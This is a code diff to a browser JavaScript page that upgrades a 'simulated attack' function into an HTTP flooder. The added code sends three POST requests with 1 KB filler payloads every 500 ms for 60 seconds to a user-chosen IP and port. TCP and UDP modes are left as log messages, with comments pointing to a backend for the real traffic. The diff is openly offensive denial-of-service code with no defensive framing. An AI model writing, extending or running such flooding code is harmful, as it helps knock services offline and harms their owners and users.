@@ -249,7 +249,7 @@
             }
         }
 
-        // Function to simulate attack
+        // Function to simulate attack with faster requests and larger payloads
         function startAttack(type, target) {
             const [targetIp, targetPort] = target.split(' ');
 
@@ -259,14 +259,50 @@
 
             log('ATTACK', `[ATTACKING STARTED On ${targetIp}:${targetPort}]`);
             let timeLeft = 60; // Default attack time: 60 seconds
+            let attackSpeed = 500; // Adjust this value to control attack speed (lower = faster)
+
             attackTimer = setInterval(() => {
-                log('ATTACK', `${type} request sent to ${targetIp}:${targetPort}`);
+                // Send multiple requests in parallel with large payload
+                sendAttackRequest(type, targetIp, targetPort); // Request 1
+                sendAttackRequest(type, targetIp, targetPort); // Request 2
+                sendAttackRequest(type, targetIp, targetPort); // Request 3
+
                 timeLeft--;
                 if (timeLeft <= 0) {
                     clearInterval(attackTimer);
                     log('ATTACK', 'Attack finished');
                 }
-            }, 1000);
+            }, attackSpeed); // Speed controlled by attackSpeed value
+        }
+
+        // Function to send a large attack request
+        function sendAttackRequest(type, targetIp, targetPort) {
+            let payload = generateLargePayload(); // Generate large payload
+
+            if (type === 'TCP') {
+                log('ATTACK', `TCP request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
+                // Simulate a TCP request (for actual TCP use backend solution)
+            } else if (type === 'UDP') {
+                log('ATTACK', `UDP request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
+                // Simulate a UDP request (for actual UDP use backend solution)
+            } else if (type === 'HTTPS') {
+                log('ATTACK', `HTTPS request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
+                // Simulate HTTPS request with fetch
+                fetch(`http://${targetIp}:${targetPort}`, {
+                    method: 'POST',
+                    body: payload,
+                    headers: { 'Content-Type': 'application/json' }
+                }).catch(err => console.log('HTTPS Request Error: ', err));
+            }
+        }
+
+        // Function to generate a large payload (1KB for example)
+        function generateLargePayload() {
+            let largePayload = '';
+            for (let i = 0; i < 1024; i++) { // 1KB payload
+                largePayload += 'A'; // Repeating 'A' to create a larger payload
+            }
+            return largePayload;
         }
 
         // Function to log output in terminal
